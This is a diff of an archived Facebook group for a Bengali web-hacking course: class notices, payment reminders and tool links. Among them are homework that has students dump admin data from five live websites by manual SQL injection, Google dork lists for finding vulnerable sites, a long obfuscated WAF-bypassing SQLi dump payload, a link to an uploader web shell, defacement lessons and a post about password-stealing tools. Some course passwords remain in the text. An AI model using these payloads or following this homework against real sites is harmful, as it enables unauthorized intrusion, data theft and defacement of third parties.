+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608248120877777)
 
-## entry-43 · OSINT — B66 Delta
+## OSINT — B66 Delta
 
-Category: documents | Date: 2026-07-26
-
-### Preserved post text
+Date: 2026-07-26 · Category: documents · ID: entry-43
 
 ডিরেক্ট ক্লাস রিসোর্স লিংক
 OSINT - B66 Delta
 
-### Preserved note
+### Notes
 
 Imp post: https://www.facebook.com/groups/awsb66delta/posts/1609893780713211
 HW: https://forms.gle/fPiaspqK6eU3vibL7
@@ -1807,18 +1710,17 @@ ceo@arenawebsecurity.net
 1.4:
 —----------------------------------------------------------------------------------------
 URL: https://www.dainikcoxsbazar.com/
-CW: https://toolkit.arenawebsecurity.net/practice/play.php?play=ivmyhs
+CW: [সীমিত প্রবেশাধিকার]
 
 
 —----------------------------------------------------------------------------------------
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609800807389175
+- [Resource](https://docs.google.com/document/d/1PVu1YmjTLqqe5ZToj9tb8fErVG36hUUxxVlHmNh9rZE/edit)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609800807389175)
 
-## entry-44 · সবাই ক্লাসে চলে আসুন।
+## সবাই ক্লাসে চলে আসুন।
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-44
 
 সবাই ক্লাসে চলে আসুন।
 posted to
@@ -1826,23 +1728,20 @@ Admin
 ·
 OSINT - B66 Delta
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609800030722586
+- [Resource](https://www.facebook.com/groups/awsb66delta/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609800030722586)
 
-## entry-45 · OSINT - B66 Delta
+## OSINT - B66 Delta
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-45
 
 OSINT - B66 Delta
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1609799717389284
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609799717389284)
 
-## entry-48 · কি এক্ট্যা অবস্থা !!!
+## কি এক্ট্যা অবস্থা !!!
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-48
 
 কি এক্ট্যা অবস্থা !!!
 আপনার কাছের কেউ যদি আপনার ওয়াই-ফাই পাসওয়ার্ড বা মেইলের পাসওয়ার্ড চুরি করে আপনারই সামনে বসে,
@@ -1868,33 +1767,31 @@ Password: aws
 বিশেষ দ্রঃ আপনি আবার এই আন-ইথিক্যাল কাজটি করে বসেবেন না যেন। মোবাইল রিসেট করেছেন, বা রাউটার রিসেট করেছেন বা আপনার ওয়াইফাই পাসওয়ার্ড ভুলে গেছেন, এখন বন্ধু কে দিতে হবে সেক্ষেত্রে পিসি থেকে এই টুলস্‌ দিয়ে পাসওয়ার্ডটি বের করে নিতে পারেন।
 পাশের বাসার আপুর পিসিতে বসে আবার এপ্লাই করতে যাইয়েন না!
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1610714410631148
+- [Resource](https://drive.google.com/file/d/1oUm1cRDQ1eH4VfjWUhA6rSJrYUACQq5J/view)
+- [Resource](https://drive.google.com/file/d/1VhplhDCOGV4f709rRKzysbSQKgwUFRRJ/view)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1610714410631148)
 
-## entry-50 · Extra support session will start from 7:00 PM
+## Extra support session will start from 7:00 PM
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-50
 
 Extra support session will start from 7:00 PM
 Get
 CyberFox
 tools related support before starting the class. To join the video meeting, click this link:
-Otherwise, to join by phone, dial +1 424-292-0230 and enter this PIN: 673 349 577#
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 meet.google.com
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1612996040402985
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1612996040402985)
 
-## entry-51 · CyberFox for Mac.txt
+## CyberFox for Mac.txt
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: 2026-07-31 · Category: information · ID: entry-51
 
 Text
 CyberFox for Mac.txt
 
-### Preserved note
+### Notes
 
 https://classic.waterfox.net/								Cyberfox Alternative
 https://drive.google.com/file/d/11rlRdQ_JZNbij2ie1TaMt4YHQ9vq4x-o/view			HackBar Addons
@@ -1902,28 +1799,19 @@ https://drive.google.com/file/d/11rlRdQ_JZNbij2ie1TaMt4YHQ9vq4x-o/view			HackBar
 https://theunarchiver.com/								for zip extraction if need!
 https://drive.google.com/file/d/1EC-eNnWwfzTXn0eISqG7GLVa3rn9Wnsq/view?usp=drive_link	Setup tutorial
 
-Own document copy: /documents/cyberfox-for-mac.txt
+- [Resource](https://www.facebook.com/download/1074110211846797/CyberFox%20for%20Mac.txt)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1612892513746671)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1612892513746671
+## Arena private Campus directory
 
-## entry-52 · Arena private Campus directory
+Date: unverified · Category: information · ID: entry-52
 
-Category: information | Date: not verified
+সীমিত প্রবেশাধিকারযুক্ত কোর্স রিসোর্স। পাসওয়ার্ড ও ব্যক্তিগত লিংক পাবলিক আর্কাইভে প্রকাশ করা হয়নি।
 
-### Preserved post text
 
-Arena private Campus directory
-Password: loveaws
-toolkit.arenawebsecurity.net
-Arena Cyber Command
+## সবাই ক্লাসে চলে আসুন।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1610714913964431
-
-## entry-53 · সবাই ক্লাসে চলে আসুন।
-
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-53
 
 সবাই ক্লাসে চলে আসুন।
 posted to
@@ -1931,21 +1819,19 @@ Admin
 ·
 Session hijacking / Blocking, Mid Exam prep
 
-## entry-54 · Session hijacking / Blocking, Mid Exam prep
+- [Resource](https://www.facebook.com/groups/awsb66delta/)
 
-Category: information | Date: not verified
+## Session hijacking / Blocking, Mid Exam prep
 
-### Preserved post text
+Date: unverified · Category: information · ID: entry-54
 
 Session hijacking / Blocking, Mid Exam prep
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614142453621677
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614142453621677)
 
-## entry-55 · গুরুত্বপূর্ণ নোটিশঃ দ্বিতীয় ইন্সটলমেন্ট সংক্রান্ত পোস্ট, ১০% জরিমানা এবং সাসপেনশন এড়াতে ২য় ইন্সটল…
+## গুরুত্বপূর্ণ নোটিশঃ দ্বিতীয় ইন্সটলমেন্ট সংক্রান্ত পোস্ট, ১০% জরিমানা এবং সাসপেনশন এড়াতে ২য় ইন্সটল…
 
-Category: notices | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: notices · ID: entry-55
 
 গুরুত্বপূর্ণ নোটিশঃ দ্বিতীয় ইন্সটলমেন্ট সংক্রান্ত পোস্ট, ১০% জরিমানা এবং সাসপেনশন এড়াতে ২য় ইন্সটলম্যান্ট পরিশোধ করে নিন।
 
@@ -1967,52 +1853,41 @@ HTTPS://DOCS.GOOGLE.COM/DOCUMENT/D/1L093GBZBOOWWHAQN8GENA9KKHPIWTUJCKOYZ7K1SIHS/
 
 পোর্টাল থেকে পেমেন্টের বিস্তারিত নিচে প্রদত্ত ছবিতে দেওয়া আছে। @EVERYONE
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614265676942688
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614265676942688)
 
-## entry-56 · Gift for AWS Batch 66 Delta
+## Gift for AWS Batch 66 Delta
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-56
 
 Gift for AWS Batch 66 Delta
 E-book copy:
 PDF copy:
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614259826943273
+- [Resource](https://cybernirapotta.arenawebsecurity.net/)
+- [Resource](https://shorturl.at/ZVBbu)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614259826943273)
 
-## entry-57 · যাদের cyberfox রিলেটেড ইস্যু আছে তারা এই লিংকে জয়েন করুন
+## যাদের cyberfox রিলেটেড ইস্যু আছে তারা এই লিংকে জয়েন করুন
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-57
 
 যাদের cyberfox রিলেটেড ইস্যু আছে তারা এই লিংকে জয়েন করুন
 meet.google.com/esk-jxss-ivm
 সাপোর্ট চলবে রাত ১১:৪৫ মিনিট পর্যন্ত
 Closed : 1:00 AM
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614232903612632
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614232903612632)
 
-## entry-59 · CYBER-71 private exploit tools
+## CYBER-71 private exploit tools
 
-Category: tools | Date: not verified
+Date: unverified · Category: tools · ID: entry-59
 
-### Preserved post text
+সীমিত প্রবেশাধিকারযুক্ত কোর্স রিসোর্স। পাসওয়ার্ড ও ব্যক্তিগত লিংক পাবলিক আর্কাইভে প্রকাশ করা হয়নি।
 
-CYBER-71 private exploit tools
-https://toolkit.arenawebsecurity.net/tools/admin_finder.php
-Password: loveaws
-toolkit.arenawebsecurity.net
-Secure Access
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614765363559386
+## VIDEO FOR NO-REDIRECT
 
-## entry-60 · VIDEO FOR NO-REDIRECT
-
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-60
 
 VIDEO FOR NO-REDIRECT
 ফাইনালী সাথে একটি পুরনো ভিডিও সংযুক্ত করে দিলাম
@@ -2021,23 +1896,19 @@ VIDEO FOR NO-REDIRECT
 Enjoy video
 0:00 / 0:00
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1614257150276874
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614257150276874)
 
-## entry-61 · Manual SQL Injection
+## Manual SQL Injection
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-61
 
 Manual SQL Injection
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1615883486780907
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615883486780907)
 
-## entry-63 · আপনাদের হোমওয়ার্ক:
+## আপনাদের হোমওয়ার্ক:
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-63
 
 আপনাদের হোমওয়ার্ক:
 যে কোন পাঁচটি সাইট ম্যানুয়ালি এসকিউএল ইনজেকশন এর মাধ্যমে এডমিনের ইনফরমেশন ডাম্প করা। এখন আপনি চাইলে নিজে থেকে সাইট খুঁজে নিয়ে কাজ করতে পারেন অথবা এখানে দশটি সাইট রয়েছে এখান থেকেও যেকোন পাঁচটি করে নিতে পারবেন ধন্যবাদ।
@@ -2045,7 +1916,7 @@ https://docs.google.com/document/d/1nFaeFgkMQ6EN0SXgnOKax06xKqMsVIMdFTabBcUaEp4/
 docs.google.com
 Submit 5 manual SQLi sites link with screenshot
 
-### Preserved note
+### Notes
 
 Manual dump the data of any five websites from here
 
@@ -2080,90 +1951,78 @@ Google Dork
 
 Example of homework PDF
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1615964790106110
+- [Resource](https://docs.google.com/document/d/1nFaeFgkMQ6EN0SXgnOKax06xKqMsVIMdFTabBcUaEp4/edit?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615964790106110)
 
-## entry-65 · CyberFox ultimate version
+## CyberFox ultimate version
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: 2026-07-31 · Category: information · ID: entry-65
 
 CyberFox ultimate version
 drive.google.com
 CyberfoxP.rar
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1615969903438932
+- [Resource](https://drive.google.com/file/d/1kFA53LckLr9ljMuWKGslQ45NXK_i2X25/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615969903438932)
 
-## entry-66 · Manual SQLI practice video
+## Manual SQLI practice video
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-66
 
 Manual SQLI practice video
 0:00 / 0:00
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1615969490105640
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615969490105640)
 
-## entry-67 · যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন তারা ইতিমধ্যেই ইমেইলে কনফার্মেশন পেয়ে গেছেন, কেউ কনফার্মেশন …
+## যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন তারা ইতিমধ্যেই ইমেইলে কনফার্মেশন পেয়ে গেছেন, কেউ কনফার্মেশন …
 
-Category: notices | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: notices · ID: entry-67
 
 যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন তারা ইতিমধ্যেই ইমেইলে কনফার্মেশন পেয়ে গেছেন, কেউ কনফার্মেশন না পান কিংবা পোর্টালে আপডেট না হয় ইমেইলটা পুনরায় চেক করে অবশ্যই আজকের মধ্যে ইমেইলে যোগাযোগ করে নিন।
 ২য় ইন্সটলম্যান্ট পরিশোধের নিয়ম পিন পোষ্টেই দেওয়া আছে, কমেন্টেও সংযুক্ত করে দেওয়া হচ্ছে। ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1616417463394176
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1616417463394176)
 
-## entry-68 · Manual SQL Injection practice output
+## Manual SQL Injection practice output
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-68
 
 Manual SQL Injection practice output
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1615974870105102
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615974870105102)
 
-## entry-69 · প্রাক্টিক্যালি শেখার পাশাপাশি থিউরিটিক্যালি কিছু বিষয় আমাদেরকে আত্মস্থ করতে হবে। সময় করে পিডিএফ…
+## প্রাক্টিক্যালি শেখার পাশাপাশি থিউরিটিক্যালি কিছু বিষয় আমাদেরকে আত্মস্থ করতে হবে। সময় করে পিডিএফ…
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-69
 
 প্রাক্টিক্যালি শেখার পাশাপাশি থিউরিটিক্যালি কিছু বিষয় আমাদেরকে আত্মস্থ করতে হবে। সময় করে পিডিএফ গুলো অবশ্যই পড়বেন। কোথাও কোন প্রবলেম হলে আমাকে অবশ্যই জানাবেন ধন্যবাদ।
 drive.google.com
 SQLI - Google Drive
 
-## entry-70 · কাল‌কে না‌কি পরীক্ষা!!
+- [Resource](https://drive.google.com/drive/u/3/folders/1QyI7Rwl62MMvV0MsZnWAJz2pZJEUP-Fl)
 
-Category: notices | Date: not verified
+## কাল‌কে না‌কি পরীক্ষা!!
 
-### Preserved post text
+Date: unverified · Category: notices · ID: entry-70
 
 কাল‌কে না‌কি পরীক্ষা!!
 আপনা‌দের প্রিপা‌রেশন ঠিকঠাক আ‌ছে তো???
 তাইলে আমিও পড়তে বসি
 Best of luck for me
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1618322976536958
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1618322976536958)
 
-## entry-71 · Understanding Google dork
+## Understanding Google dork
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-71
 
 Understanding Google dork
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1618321853203737
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1618321853203737)
 
-## entry-72 · প্রিয় শিক্ষার্থীবৃন্দ,
+## প্রিয় শিক্ষার্থীবৃন্দ,
 
-Category: notices | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: notices · ID: entry-72
 
 প্রিয় শিক্ষার্থীবৃন্দ,
 ইতিমধ্যেই আপনাদের পরীক্ষা শুরু হয়েছে। এক্সাম পেপার একবার রিফ্রেস করলেই প্রশ্নপত্র দেখতে পাবেন।
@@ -2173,28 +2032,25 @@ Category: notices | Date: not verified
 শুভকামনা সকলের জন্য।
 ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1620238739678715
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620238739678715)
 
-## entry-74 · ২য় ইন্সটলম্যান্ট সংক্রান্ত সর্বশেষ পোষ্টঃ
+## ২য় ইন্সটলম্যান্ট সংক্রান্ত সর্বশেষ পোষ্টঃ
 
-Category: notices | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: notices · ID: entry-74
 
 ২য় ইন্সটলম্যান্ট সংক্রান্ত সর্বশেষ পোষ্টঃ
 যারা ২য় ইন্সটলম্যান্ট পরিশোধ করেছেন সবার পোর্টালে পেমেন্ট আপডেট সহ পেমেন্ট রিসিপ্ট ইমেইলে পেয়ে গেছেন। কেউ যদি এখনো কনফার্মেশন পাওয়া বাকি থাকেন তাহলে ইমেইলটা পুনরায় চেক করে আজকে অফিস সময়ের মধ্যে আমাদের WhatsApp এ যোগাযোগ করে নিন। +8801310333444
 
-## entry-75 · Cross Site Scripting (XSS) — Class Resource
 
-Category: documents | Date: not verified
+## Cross Site Scripting (XSS) — Class Resource
 
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-75
 
 Class Resource:
 docs.google.com
 Cross Site Scripting (XSS)
 
-### Preserved note
+### Notes
 
 Cross Site Scripting (XSS)
 
@@ -2303,48 +2159,40 @@ inurl:".php?author="
 inurl:".php?pass="
 inurl:".php?feedback=”
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1621986936170562
+- [Resource](https://docs.google.com/document/d/1Rem_8oiP3SkVgZvpZ8ES1IhGXUyfivD1pnoiMhdIsSs/edit?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1621986936170562)
 
-## entry-76 · Cross Site Scripting (XSS)
+## Cross Site Scripting (XSS)
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-76
 
 Cross Site Scripting (XSS)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1621971836172072
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1621971836172072)
 
-## entry-77 · Correct Answers 1st Mid Exam CEHF
+## Correct Answers 1st Mid Exam CEHF
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-77
 
 Correct Answers 1st Mid Exam CEHF
 PDF
 Correct-Answers-66-Delta.pdf
 
-Own document copy: /documents/correct-answers-66-delta.pdf
+- [Resource](/documents/correct-answers-66-delta.pdf)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620243993011523)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1620243993011523
+## কি অবস্থা সবার??
 
-## entry-78 · কি অবস্থা সবার??
-
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-78
 
 কি অবস্থা সবার??
 এক্সাম কেমন হলো?
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1620350193000903
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620350193000903)
 
-## entry-81 · মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
+## মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-81
 
 #happy_support_day
 মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
@@ -2356,40 +2204,34 @@ Meet-এ যোগদানের তথ্য:
 প্রথম সেশন: সন্ধ্যা ৭টা থেকে রাত ৯ টা পর্যন্ত
 দ্বিতীয় সেশন: রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
 লিঙ্ক: To join the video meeting, click this link:
-https://meet.google.com/yac-xrnh-gvz
-Otherwise, to join by phone, dial +1 316-550-0070 and enter this PIN: 847 826 124#
+[মিটিং লিংক প্রকাশ করা হয়নি]
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 কিভাবে সাহায্য পাবেন: আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
 ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1622805392755383
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1622805392755383)
 
-## entry-83 · XSS
+## XSS
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-83
 
 XSS
 notepad.pw
 Save your notes online for free and share them with friends!
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1626235589079030
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626235589079030)
 
-## entry-84 · SQLi WAF
+## SQLi WAF
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-84
 
 SQLi WAF
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1626208339081755
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626208339081755)
 
-## entry-86 · WAF bypass tips-
+## WAF bypass tips-
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-86
 
 WAF bypass tips-
 আমি একটি লিংক শেয়ার করছি(যদিও সেটি ইংরেজিতে, কিন্তু বুঝার জন্য তেমন জটিল না।)
@@ -2401,18 +2243,17 @@ WAF bypass tips-
 যাইহোক নিচের লিংকে বিষয়টি অনেক সহজভাবে বুজানো আছে একটু দেখে নিন, তাহলে WAF bypass করা নিয়ে সমস্যা হবে না।।
 https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1626383222397600
+- [Resource](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626383222397600)
 
-## entry-89 · SQLi WAF — Class Resource
+## SQLi WAF — Class Resource
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-89
 
 docs.google.com
 Untitled document
 
-### Preserved note
+### Notes
 
 SQLi WAF
 
@@ -2484,57 +2325,49 @@ information_schema.(tables,colums)
 
 concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e2028416b446b292044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/
 
-## entry-91 · Burp Suite
+- [Resource](https://docs.google.com/document/d/1QAdlTL9FowtSZCWQxIanBL0aJrec_gmlwzxKoyRS5CM/edit?usp=sharing)
 
-Category: information | Date: not verified
+## Burp Suite
 
-### Preserved post text
+Date: unverified · Category: information · ID: entry-91
 
 Burp Suite
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1628018352234087
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628018352234087)
 
-## entry-92 · Post Based SQLi
+## Post Based SQLi
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-92
 
 Post Based SQLi
 0:00 / 6:30
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1626383545730901
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626383545730901)
 
-## entry-93 · বার্পসুইট ভিডিও রিসোর্স
+## বার্পসুইট ভিডিও রিসোর্স
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-93
 
 বার্পসুইট ভিডিও রিসোর্স
 পাসওয়ার্ডঃ aws
 drive.google.com
 Burp Suite Unfiltered - Go from a Beginner to Advanced!.rar
+এটি ২৭টি সহায়ক ভিডিওর RAR আর্কাইভ; Burp Suite installer নয়।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1628369578865631
+- [Burp Suite Unfiltered - Go from a Beginner to Advanced!.rar](https://drive.google.com/file/d/1jlVQCoMTK1qhDw5BfmuayelXAyZR2je3/view)
+- [Resource](https://drive.google.com/file/d/1h60zw8KvLbSolk5TQk8RxYwrtfHTDrQh/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628369578865631)
 
-## entry-94 · আপনাদের প্রথম মিড এক্সাম এর রেজাল্ট পাবলিশ হয়েছে। যারা ১৪ এর কম পেয়েছেন তারা আগামী ৭২ঘন্টার মধ্যে…
+## আপনাদের প্রথম মিড এক্সাম এর রেজাল্ট পাবলিশ হয়েছে। যারা ১৪ এর কম পেয়েছেন তারা আগামী ৭২ঘন্টার মধ্যে…
 
-Category: notices | Date: not verified
+Date: unverified · Category: notices · ID: entry-94
 
-### Preserved post text
+ব্যক্তিগত পরীক্ষার ফলাফল পাবলিক আর্কাইভে প্রকাশ করা হয়নি। শিক্ষার্থীরা কোর্সের নিজস্ব চ্যানেলে ফলাফল পাবেন।
 
-আপনাদের প্রথম মিড এক্সাম এর রেজাল্ট পাবলিশ হয়েছে। যারা ১৪ এর কম পেয়েছেন তারা আগামী ৭২ঘন্টার মধ্যে qrteam@arenawebsecurity.net এ যথা উপযুক্ত কারণ দর্শিয়ে ইমেইল করবেন।
-drive.google.com
-B-66 Delta Mid Result.pdf
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1628369195532336
+## সবাই ক্লাসে দেখানো প্রসেস অনুযায়ী Burp Suite ইন্সটল করে নিবেন।
 
-## entry-95 · সবাই ক্লাসে দেখানো প্রসেস অনুযায়ী Burp Suite ইন্সটল করে নিবেন।
-
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-95
 
 সবাই ক্লাসে দেখানো প্রসেস অনুযায়ী Burp Suite ইন্সটল করে নিবেন।
 কোনো প্রবলেম ফেইস করলে কমেন্টে জানাবেন।
@@ -2548,13 +2381,12 @@ https://drive.google.com/.../1yYYnbFzIxUpX4SOCE3nya.../
 FIREFOX PORTABLE BROWSE
 https://portableapps.com/apps/internet/firefox_portable
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1628161408886448
+- [Resource](https://portableapps.com/apps/internet/firefox_portable)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628161408886448)
 
-## entry-96 · Forensic Related Post
+## Forensic Related Post
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-96
 
 Forensic Related Post
 Browser Forensic
@@ -2571,23 +2403,20 @@ Browser Forensic
 পাসওয়ার্ডঃ aws
 https://drive.google.com/file/d/1yxRfF_sfExt6hhe79eGUq2BSEBYl7SLW/view?usp=sharing
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1628370425532213
+- [Resource](https://drive.google.com/file/d/1yxRfF_sfExt6hhe79eGUq2BSEBYl7SLW/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628370425532213)
 
-## entry-97 · Deface page making
+## Deface page making
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-97
 
 Deface page making
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632429445126311
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632429445126311)
 
-## entry-98 · আসুন জেনে নেই- ৬
+## আসুন জেনে নেই- ৬
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-98
 
 আসুন জেনে নেই- ৬
 (Upload vulnerability)
@@ -2600,65 +2429,54 @@ Category: information | Date: not verified
 ধন্যবাদ।
 ও হ্যাঁ আপলোডার শেল লিঙ্ক: https://limewire.com/d/i3zYX#8bczA284ol
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632429001793022
+- [Resource](https://limewire.com/d/i3zYX#8bczA284ol)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632429001793022)
 
-## entry-100 · WebShell / Backdoor concept & deface page making
+## WebShell / Backdoor concept & deface page making
 
